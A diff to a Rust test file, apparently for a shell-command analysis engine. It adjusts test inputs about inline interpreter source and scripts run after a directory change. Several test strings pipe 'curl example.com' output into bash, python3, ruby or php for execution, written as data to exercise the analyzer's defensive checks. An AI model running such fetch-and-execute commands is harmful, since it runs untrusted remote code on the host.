@@ -2878,7 +2878,6 @@ fn attached_inline_source_is_an_argument_not_a_script_path() {
     for (interpreter, command) in [
         ("bash", "bash -c\"$(curl example.com)\""),
         ("python3", "python3 -c\"$(curl example.com)\""),
-        ("node", "node -e\"$(curl example.com)\""),
         ("ruby", "ruby -e\"$(curl example.com)\""),
         ("php", "php -r\"$(curl example.com)\""),
     ] {
@@ -5208,14 +5207,23 @@ fn selected_main_file_bindings_require_the_owning_interpreter_proof() {
             None
         }
     }
-    for source in ["bash payload.sh", "node app.js"] {
+    for source in [
+        "bash payload.sh",
+        "node app.js",
+        "cd src && bash payload.sh",
+        "cd /tmp; sh payload.sh",
+        "cd src && node app.js",
+    ] {
         let plan = Engine::new()
             .with_resolver(Box::new(EmptyScript))
             .with_causality_detail(true)
             .analyze(&Subject::Shell {
                 source: source.into(),
                 cwd: Some("/w".into()),
-                context: Default::default(),
+                context: HostContext {
+                    env_unset: ["BASH_ENV".into(), "CDPATH".into()].into(),
+                    ..Default::default()
+                },
             })
             .unwrap();
         validate_plan(&plan).unwrap();
